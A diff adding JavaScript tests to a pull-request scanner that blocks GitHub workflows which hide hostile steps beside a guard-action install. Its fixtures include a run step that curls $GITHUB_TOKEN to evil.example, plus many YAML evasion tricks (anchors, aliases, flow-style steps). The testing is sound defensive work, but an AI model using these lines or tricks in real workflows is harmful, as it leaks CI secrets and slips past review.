@@ -1,6 +1,7 @@
 const assert = require("assert");
 const {
   detectStructuralFindings,
+  workflowExecutableUses,
   findUnpinnedActions,
   introducesOidcWritePermission,
   introducesWritePermissions,
@@ -964,5 +965,513 @@ for (const eventName of ["pull_request", "pull_request_review", "merge_group"]) 
     `event ${eventName} must keep the install carve-out`,
   );
 }
+
+// --- the carve-out must not license a workflow that does more than install ---
+// A guard step alone was not enough: a workflow carrying a real guard step AND
+// an exfiltrating `run:` produced zero blocking findings, because the
+// id-token/contents pair reads as OIDC and is only a warning. The install must
+// therefore hold as a whole file.
+const GUARD_WF_PATH = ".github/workflows/aport-guard.yml";
+const installOf = (patch) =>
+  blockingCodes(onPullRequest({
+    files: [{ filename: GUARD_WF_PATH, status: "added", patch }],
+  }));
+
+assert.deepEqual(installOf(guardInstallPatch()), [], "a clean install still passes");
+assert.deepEqual(
+  installOf(guardInstallPatch("+      - uses: actions/checkout@v4")),
+  [],
+  "checkout alongside the guard is still an install",
+);
+
+for (const [label, extra] of [
+  ["an exfiltrating run step", ['+      - run: curl https://evil.example -d "$GITHUB_TOKEN"']],
+  ["an unrelated action step", ["+      - uses: some/other-action@v1"]],
+  ["a second job running code", ["+  evil:", "+    if: false", "+    steps:", "+      - run: whoami"]],
+  ["a run step inside a block scalar", ["+      - name: x", "+        run: |", "+          echo nested"]],
+]) {
+  assert(
+    installOf(guardInstallPatch(...extra)).length > 0,
+    `${label} must not qualify as an install`,
+  );
+}
+
+// pull_request_target runs with the base repo's secrets against fork-authored
+// head content, so it never gets the downgrade however the docs are read.
+assert.equal(
+  detectStructuralFindings({
+    eventName: "pull_request_target",
+    files: [{ filename: GUARD_WF_PATH, status: "added", patch: guardInstallPatch() }],
+  }).find((f) => f.code === "OAP.REPO.PROTECTED_PATH_TOUCHED").severity,
+  "high",
+);
+
+// The slug is compared whole. A substring match would accept both of these,
+// which is exactly what the lookalike rule exists to stop.
+for (const slug of ["evil-aporthq/policy-verify-action", "aporthq/policy-verify-action-evil"]) {
+  assert(
+    installOf(["@@", "+jobs:", "+  a:", "+    steps:", `+      - uses: ${slug}@v1`].join("\n")).length > 0,
+    `${slug} must not qualify as the guard`,
+  );
+}
+
+// A block scalar body indented only one level past its key: the position check
+// alone does not reject this, so it exercises the block-scalar tracking itself.
+assert(
+  installOf(["@@", "+jobs:", "+  a:", "+    steps:", "+      - run: |",
+             "+        uses: aporthq/policy-verify-action@v1"].join("\n")).length > 0,
+  "a uses: inside a shallowly-indented block scalar is not a step",
+);
+
+// --- a uses: only counts where it actually runs -------------------------
+// Accepting any indented uses: let a workflow park the guard reference in inert
+// data (env:, with:, a strategy matrix) while running something else, and the
+// line-oriented scan could not see flow-style steps at all. Both halves of that
+// bypass are one PR: guard in data, hostile action in a flow step.
+const GUARD_REF = "aporthq/policy-verify-action@v1";
+const wf = (patch) =>
+  onPullRequest({ files: [{ filename: ".github/workflows/w.yml", status: "added", patch }] });
+const wfBlocks = (patch) => blockingCodes(wf(patch)).length > 0;
+
+assert(!wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:", `+      - uses: ${GUARD_REF}`].join("\n")),
+  "a normal install still reads as one");
+assert(!wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:", "+      - name: guard",
+                  `+        uses: ${GUARD_REF}`].join("\n")),
+  "uses: as a later key of the step mapping still reads as one");
+
+for (const [label, lines] of [
+  ["an env: mapping", ["+jobs:", "+  d:", "+    env:", `+      uses: ${GUARD_REF}`,
+                       "+    steps:", "+      - uses: evil/action@v1"]],
+  ["a with: mapping", ["+jobs:", "+  d:", "+    steps:", "+      - uses: evil/action@v1",
+                       "+        with:", `+          uses: ${GUARD_REF}`]],
+  ["a strategy matrix", ["+jobs:", "+  d:", "+    strategy:", "+      matrix:",
+                         `+        uses: ${GUARD_REF}`, "+    steps:", "+      - uses: evil/a@v1"]],
+  ["workflow_call inputs", ["+on:", "+  workflow_call:", "+    inputs:",
+                            `+      uses: ${GUARD_REF}`, "+jobs:", "+  d:", "+    steps:",
+                            "+      - run: echo"]],
+]) {
+  assert(wfBlocks(["@@", ...lines].join("\n")),
+    `a guard reference in ${label} is data, not an install`);
+}
+
+// Flow style runs like any other step, so a hostile action written that way has
+// to be seen.
+assert(wfBlocks(["@@", "+jobs:", "+  d:", "+    steps:",
+                 "+      - { uses: evil/action@v1 }", `+      - { uses: ${GUARD_REF} }`].join("\n")),
+  "a flow-style hostile step disqualifies the install");
+assert(wfBlocks(["@@", "+jobs:", "+  d:", `+    steps: [{uses: ${GUARD_REF}}, {uses: evil/a@v1}]`].join("\n")),
+  "a flow-style steps array is scanned for every uses:");
+
+// The scan itself, isolated. The two fixes above overlap -- flow-style scanning
+// catches some of the same PRs -- so assert the executable-position rule
+// directly, or a regression in it hides behind the other check.
+assert.deepEqual(
+  workflowExecutableUses(
+    "jobs:\n  d:\n    env:\n      uses: aporthq/policy-verify-action@v1\n" +
+    "    steps:\n      - uses: actions/checkout@v4\n",
+  ),
+  ["actions/checkout@v4"],
+  "a uses: in an env: mapping is data and is not returned",
+);
+assert.deepEqual(
+  workflowExecutableUses("jobs:\n  v:\n    steps:\n      - uses: aporthq/policy-verify-action@v1\n"),
+  ["aporthq/policy-verify-action@v1"],
+  "a real step is returned",
+);
+assert.deepEqual(
+  workflowExecutableUses("jobs:\n  call:\n    uses: octo/repo/.github/workflows/w.yml@v1\n"),
+  ["octo/repo/.github/workflows/w.yml@v1"],
+  "jobs.<id>.uses is executable and is returned",
+);
+assert.deepEqual(
+  workflowExecutableUses("jobs:\n  d:\n    steps:\n      - { uses: evil/action@v1 }\n"),
+  ["evil/action@v1"],
+  "a flow-style step is scanned",
+);
+
+// Raised on the mirror repo (policy-verify-action PRs 16 and 17), verified here
+// because this directory is the source of truth.
+for (const [label, lines] of [
+  ["a job-level reusable workflow call", [
+    "+jobs:", "+  v:", "+    steps:", `+      - uses: ${GUARD_REF}`,
+    "+  deploy:", "+    uses: attacker/repo/.github/workflows/deploy.yml@abc123"]],
+  ["a flow-style run step", [
+    "+jobs:", "+  v:", "+    steps:", `+      - uses: ${GUARD_REF}`,
+    "+      - { run: curl https://evil.example }"]],
+]) {
+  assert(wfBlocks(["@@", ...lines].join("\n")),
+    `${label} means the workflow does more than install the guard`);
+}
+
+// Codex review of this branch. Each case turned on an assumption the hand-rolled
+// scanner made about layout rather than about YAML.
+
+// A: the job mapping's child indent is read from the file. Hardcoding two spaces
+// meant a four-space workflow's reusable-workflow call was never returned, so a
+// file carrying the guard AND a hostile call still read as a plain install.
+assert.deepEqual(
+  workflowExecutableUses(
+    "jobs:\n    verify:\n        steps:\n            - uses: " + GUARD_REF + "\n" +
+    "    deploy:\n        uses: attacker/repo/.github/workflows/x.yml@sha\n",
+  ),
+  [GUARD_REF, "attacker/repo/.github/workflows/x.yml@sha"],
+  "a four-space reusable workflow call is executable and is returned",
+);
+assert(
+  wfBlocks(["@@", "+jobs:", "+    verify:", "+        steps:",
+            `+            - uses: ${GUARD_REF}`, "+    deploy:",
+            "+        uses: attacker/repo/.github/workflows/x.yml@sha"].join("\n")),
+  "a four-space hostile reusable workflow call disqualifies the install",
+);
+
+// B: a sequence item may sit at the same column as the `steps:` key that owns
+// it. Requiring a deeper indent hid the guard step, blocking a clean install.
+assert.deepEqual(
+  workflowExecutableUses("jobs:\n  v:\n    steps:\n    - uses: " + GUARD_REF + "\n"),
+  [GUARD_REF],
+  "a step at the same indent as steps: is still a step",
+);
+assert(
+  !wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:", `+    - uses: ${GUARD_REF}`].join("\n")),
+  "an install written with indentationless sequence items still reads as one",
+);
+
+// C: hasRunStep has to look inside an inline steps array. The executable scan
+// finds the guard there, so missing the shell step handed the carve-out to a
+// workflow that runs arbitrary code.
+assert(
+  wfBlocks(["@@", "+jobs:", "+  v:",
+            `+    steps: [{ uses: ${GUARD_REF} }, { run: whoami }]`].join("\n")),
+  "a run: step inside an inline steps array disqualifies the install",
+);
+
+// D: only the step mapping's own `uses` key executes. Collecting every `uses:`
+// in the flow mapping let the guard reference hide in a nested input value --
+// the inert-data bypass, reintroduced for flow style.
+assert.deepEqual(
+  workflowExecutableUses(
+    "jobs:\n  v:\n    steps:\n      - { uses: actions/checkout@v4, with: { uses: " +
+    GUARD_REF + " } }\n",
+  ),
+  ["actions/checkout@v4"],
+  "a uses: nested in a flow-style with: is data and is not returned",
+);
+assert(
+  wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:",
+            `+      - { uses: actions/checkout@v4, with: { uses: ${GUARD_REF} } }`].join("\n")),
+  "the guard hidden in a flow-style with: does not qualify as an install",
+);
+
+// E: comments are not YAML structure. A column-zero comment between step items
+// must not clear the active steps sequence and hide the later hostile action.
+assert.deepEqual(
+  workflowExecutableUses(
+    "jobs:\n  v:\n    steps:\n      - uses: " + GUARD_REF + "\n" +
+    "# reviewed by security\n      - uses: attacker/action@v1\n",
+  ),
+  [GUARD_REF, "attacker/action@v1"],
+  "comment-only lines do not leave the active steps sequence",
+);
+assert(
+  wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:", `+      - uses: ${GUARD_REF}`,
+            "+# reviewed by security", "+      - uses: attacker/action@v1"].join("\n")),
+  "a hostile action after a comment-only line disqualifies the install",
+);
+
+// F: YAML anchors on job ids do not change the mapping. The anchored job still
+// owns its child keys, including a reusable-workflow call.
+assert.deepEqual(
+  workflowExecutableUses(
+    "jobs:\n  deploy: &deploy\n    uses: attacker/repo/.github/workflows/x.yml@main\n" +
+    "  verify:\n    steps:\n      - uses: " + GUARD_REF + "\n",
+  ),
+  ["attacker/repo/.github/workflows/x.yml@main", GUARD_REF],
+  "a reusable workflow under an anchored job id is executable",
+);
+assert(
+  wfBlocks(["@@", "+jobs:", "+  deploy: &deploy",
+            "+    uses: attacker/repo/.github/workflows/x.yml@main",
+            "+  verify:", "+    steps:", `+      - uses: ${GUARD_REF}`].join("\n")),
+  "an anchored hostile reusable workflow disqualifies the install",
+);
+
+// G: escaped quotes inside nested flow values must stay inside the nested
+// value; inert string text that looks like a guard step must not be promoted to
+// an outer `uses` key.
+assert.deepEqual(
+  workflowExecutableUses(
+    "jobs:\n  v:\n    steps:\n      - { uses: attacker/action@v1, with: { note: \"x \\\" }, uses: " +
+    GUARD_REF + "\" } }\n",
+  ),
+  ["attacker/action@v1"],
+  "escaped quotes in nested flow values do not expose fake outer uses keys",
+);
+assert(
+  wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:",
+            `+      - { uses: attacker/action@v1, with: { note: "x \\" }, uses: ${GUARD_REF}" } }`].join("\n")),
+  "a fake guard in a quoted nested flow value does not qualify as an install",
+);
+
+// H: a flow-style steps array may be split across lines. Those entries are
+// still the steps sequence and must be scanned before allowing a bootstrap.
+assert.deepEqual(
+  workflowExecutableUses(
+    "jobs:\n  guard:\n    steps: [{ uses: " + GUARD_REF + " }]\n" +
+    "  v:\n    steps: [\n      { uses: attacker/action@v1 }\n    ]\n",
+  ),
+  [GUARD_REF, "attacker/action@v1"],
+  "multiline flow-style steps arrays are scanned",
+);
+assert(
+  wfBlocks(["@@", "+jobs:", "+  guard:", `+    steps: [{ uses: ${GUARD_REF} }]`,
+            "+  v:", "+    steps: [", "+      { uses: attacker/action@v1 }", "+    ]"].join("\n")),
+  "a hostile action in a multiline flow steps array disqualifies the install",
+);
+
+// I: a bare sequence indicator is still a step. Its following indented mapping
+// must be treated as the step body.
+assert.deepEqual(
+  workflowExecutableUses(
+    "jobs:\n  guard:\n    steps:\n      - uses: " + GUARD_REF + "\n" +
+    "      -\n        uses: attacker/action@v1\n",
+  ),
+  [GUARD_REF, "attacker/action@v1"],
+  "a bare dash followed by uses: is a step mapping",
+);
+assert(
+  wfBlocks(["@@", "+jobs:", "+  guard:", "+    steps:", `+      - uses: ${GUARD_REF}`,
+            "+      -", "+        uses: attacker/action@v1"].join("\n")),
+  "a hostile action after a bare step indicator disqualifies the install",
+);
+
+// J: flow-style `run` keys outside the active steps sequence are inert data and
+// should not turn a clean bootstrap into a high-severity control-plane change.
+assert(
+  !wfBlocks(["@@", "+jobs:", "+  v:", "+    strategy:", "+      matrix:",
+             "+        include:", "+          - { run: harmless }",
+             "+    steps:", `+      - uses: ${GUARD_REF}`].join("\n")),
+  "a flow-style run key in matrix data is not an executable shell step",
+);
+
+// K: required SHA pinning must also inspect flow-style executable action refs.
+assert.deepEqual(
+  findUnpinnedActions("jobs:\n  v:\n    steps:\n      - { uses: " + GUARD_REF + " }\n"),
+  [GUARD_REF],
+  "flow-style executable actions are checked for SHA pinning",
+);
+
+// L: flow-style mappings outside steps are data. A fake guard in matrix data
+// must not make a workflow with only checkout look like a guard install.
+assert.deepEqual(
+  workflowExecutableUses(
+    "jobs:\n  v:\n    strategy:\n      matrix:\n        include:\n          - { uses: " +
+    GUARD_REF + " }\n    steps:\n      - uses: actions/checkout@v4\n",
+  ),
+  ["actions/checkout@v4"],
+  "flow-style mappings are only scanned as actions under the active steps sequence",
+);
+assert(
+  wfBlocks(["@@", "+jobs:", "+  v:", "+    strategy:", "+      matrix:",
+            "+        include:", `+          - { uses: ${GUARD_REF} }`,
+            "+    steps:", "+      - uses: actions/checkout@v4"].join("\n")),
+  "a guard hidden in flow-style matrix data does not qualify as an install",
+);
+
+// M: the child column of a block-style step is the actual first key after the
+// dash, not always dash-column + 2. Multiple separation spaces are valid YAML.
+assert.deepEqual(
+  workflowExecutableUses(
+    "jobs:\n  v:\n    steps:\n      -    name: bad\n           uses: attacker/action@v1\n" +
+    "      - uses: " + GUARD_REF + "\n",
+  ),
+  ["attacker/action@v1", GUARD_REF],
+  "step keys align with the actual mapping column after a dash",
+);
+assert(
+  wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:", "+      -    name: bad",
+            "+           uses: attacker/action@v1", `+      - uses: ${GUARD_REF}`].join("\n")),
+  "a hostile action aligned under a wide dash separator disqualifies the install",
+);
+
+// N: YAML only treats backslash as an escape in double-quoted scalars. A
+// single-quoted value ending in a literal backslash must not keep the scanner
+// in quote mode and hide the later outer uses key.
+assert.deepEqual(
+  workflowExecutableUses(
+    "jobs:\n  v:\n    steps:\n      - { with: { note: '\\\\' }, uses: attacker/action@v1 }\n" +
+    "      - uses: " + GUARD_REF + "\n",
+  ),
+  ["attacker/action@v1", GUARD_REF],
+  "single-quoted backslashes do not escape the closing quote",
+);
+assert(
+  wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:",
+            "+      - { with: { note: '\\\\' }, uses: attacker/action@v1 }",
+            `+      - uses: ${GUARD_REF}`].join("\n")),
+  "an attacker action after a single-quoted backslash disqualifies the install",
+);
+
+// O: explicit-key YAML syntax (`? key` then `:`) is equivalent to a normal
+// mapping key and can define a reusable-workflow job.
+assert.deepEqual(
+  workflowExecutableUses(
+    "jobs:\n  ? deploy\n  :\n    uses: attacker/repo/.github/workflows/x.yml@main\n" +
+    "  verify:\n    steps:\n      - uses: " + GUARD_REF + "\n",
+  ),
+  ["attacker/repo/.github/workflows/x.yml@main", GUARD_REF],
+  "explicit YAML job keys establish reusable-workflow job scope",
+);
+assert(
+  wfBlocks(["@@", "+jobs:", "+  ? deploy", "+  :",
+            "+    uses: attacker/repo/.github/workflows/x.yml@main",
+            "+  verify:", "+    steps:", `+      - uses: ${GUARD_REF}`].join("\n")),
+  "a hostile reusable workflow under an explicit job key disqualifies the install",
+);
+
+// P: an alias used as a step may resolve to executable YAML anchored elsewhere.
+// The lightweight scanner does not resolve anchors, so it must fail closed for
+// bootstrap classification instead of pretending the alias is harmless.
+assert(
+  wfBlocks(["@@", "+jobs:", "+  v:", "+    strategy:", "+      matrix:",
+            "+        include:", "+          - &bad", "+            uses: attacker/action@v1",
+            "+    steps:", `+      - uses: ${GUARD_REF}`, "+      - *bad"].join("\n")),
+  "a step alias disqualifies a bootstrap install unless it is resolved",
+);
+
+// Q: a flow-style step mapping may span lines. It is still one executable step.
+assert.deepEqual(
+  workflowExecutableUses(
+    "jobs:\n  v:\n    steps:\n      - { name: hostile,\n          uses: attacker/action@v1 }\n" +
+    "      - uses: " + GUARD_REF + "\n",
+  ),
+  ["attacker/action@v1", GUARD_REF],
+  "multiline flow-style step mappings are scanned",
+);
+assert(
+  wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:", "+      - { name: hostile,",
+            "+          uses: attacker/action@v1 }", `+      - uses: ${GUARD_REF}`].join("\n")),
+  "a hostile action in a multiline flow-style step disqualifies the install",
+);
+
+// R: reusable-workflow jobs can also be written as flow mappings.
+assert.deepEqual(
+  workflowExecutableUses(
+    "jobs:\n  deploy: { uses: attacker/repo/.github/workflows/x.yml@main }\n" +
+    "  verify:\n    steps:\n      - uses: " + GUARD_REF + "\n",
+  ),
+  ["attacker/repo/.github/workflows/x.yml@main", GUARD_REF],
+  "flow-style reusable workflow jobs are executable",
+);
+assert(
+  wfBlocks(["@@", "+jobs:", "+  deploy: { uses: attacker/repo/.github/workflows/x.yml@main }",
+            "+  verify:", "+    steps:", `+      - uses: ${GUARD_REF}`].join("\n")),
+  "a hostile flow-style reusable workflow disqualifies the install",
+);
+assert.deepEqual(
+  workflowExecutableUses(
+    "jobs:\n  v:\n    env: { uses: " + GUARD_REF + " }\n" +
+    "    steps:\n      - uses: actions/checkout@v4\n",
+  ),
+  ["actions/checkout@v4"],
+  "flow mappings below a job do not count as reusable-workflow jobs",
+);
+assert(
+  wfBlocks(["@@", "+jobs:", "+  v:", `+    env: { uses: ${GUARD_REF} }`,
+            "+    steps:", "+      - uses: actions/checkout@v4"].join("\n")),
+  "a fake guard reference in job data does not qualify as an install",
+);
+
+// S: an anchor before a block-style step key does not make that key inert.
+assert.deepEqual(
+  workflowExecutableUses(
+    "jobs:\n  v:\n    steps:\n      - &bad uses: attacker/action@v1\n" +
+    "      - uses: " + GUARD_REF + "\n",
+  ),
+  ["attacker/action@v1", GUARD_REF],
+  "anchors before block-style step keys are ignored for executable scanning",
+);
+assert(
+  wfBlocks(["@@", "+jobs:", "+  v:", "+    steps:",
+            "+      - &bad uses: attacker/action@v1", `+      - uses: ${GUARD_REF}`].join("\n")),
+  "an anchored hostile block-style step disqualifies the install",
+);
+
+// T: `steps` inside matrix data is inert. It must not activate executable-step
+// scanning or let a fake guard reference qualify for bootstrap.
+assert.deepEqual(
+  workflowExecutableUses(
+    "jobs:\n  v:\n    strategy:\n      matrix:\n        steps: [{ uses: " + GUARD_REF +
+    " }]\n    steps:\n      - uses: actions/checkout@v4\n",
+  ),
+  ["actions/checkout@v4"],
+  "matrix dimensions named steps are not executable steps",
+);
+assert(
+  wfBlocks(["@@", "+jobs:", "+  v:", "+    strategy:", "+      matrix:",
+            `+        steps: [{ uses: ${GUARD_REF} }]`,
+            "+    steps:", "+      - uses: actions/checkout@v4"].join("\n")),
+  "a guard hidden in matrix.steps does not qualify as an install",
+);
+
+// U: pin checks may see only the added line of a modified workflow. Flow-style
+// action refs must still be checked without the unchanged surrounding steps key.
+assert.deepEqual(
+  findUnpinnedActions("- { uses: evil/action@v1 }"),
+  ["evil/action@v1"],
+  "flow-style patch fragments are checked for SHA pinning",
+);
+
+// V: explicit-key YAML syntax can also define a job's `steps` key.
+assert.deepEqual(
+  workflowExecutableUses(
+    "jobs:\n  guard:\n    steps:\n      - uses: " + GUARD_REF + "\n" +
+    "  v:\n    ? steps\n    :\n      - uses: attacker/action@v1\n",
+  ),
+  [GUARD_REF, "attacker/action@v1"],
+  "explicit YAML steps keys establish executable step scope",
+);
+assert(
+  wfBlocks(["@@", "+jobs:", "+  guard:", "+    steps:", `+      - uses: ${GUARD_REF}`,
+            "+  v:", "+    ? steps", "+    :", "+      - uses: attacker/action@v1"].join("\n")),
+  "a hostile action under an explicit steps key disqualifies the install",
+);
+
+// W: an alias can stand in for the entire steps sequence. Without anchor
+// resolution, the safe bootstrap behavior is to disqualify the install.
+assert(
+  wfBlocks(["@@", "+jobs:", "+  v:", "+    strategy:", "+      matrix:",
+            "+        include: &payload", "+          - uses: attacker/action@v1",
+            "+    steps: *payload", "+  guard:", "+    steps:",
+            `+      - uses: ${GUARD_REF}`].join("\n")),
+  "an aliased steps sequence disqualifies a bootstrap install",
+);
+
+// X: YAML comments start outside quoted scalars only. A hash inside a quoted
+// flow value must not truncate the executable step before its closing braces.
+assert.deepEqual(
+  workflowExecutableUses(
+    "jobs:\n  guard:\n    steps:\n      - uses: " + GUARD_REF + "\n" +
+    "      - { uses: attacker/action@v1, with: { note: \"hello # world\" } }\n",
+  ),
+  [GUARD_REF, "attacker/action@v1"],
+  "quoted hash characters inside flow values do not truncate executable steps",
+);
+assert(
+  wfBlocks(["@@", "+jobs:", "+  guard:", "+    steps:", `+      - uses: ${GUARD_REF}`,
+            "+      - { uses: attacker/action@v1, with: { note: \"hello # world\" } }"].join("\n")),
+  "a hostile flow step with a quoted hash disqualifies the install",
+);
+
+// Y: pin fallback for isolated patch fragments must not scan inert flow data
+// when the added source includes enough workflow context to scope executable
+// steps precisely.
+assert.deepEqual(
+  findUnpinnedActions(
+    "jobs:\n  v:\n    strategy:\n      matrix:\n        include:\n          - { uses: harmless-label@v1 }\n" +
+    "    steps:\n      - uses: aporthq/policy-verify-action@" + "a".repeat(40) + "\n",
+  ),
+  [],
+  "flow-style pin fallback ignores inert data when workflow scope is present",
+);
 
 console.log("OK structural.test.js");
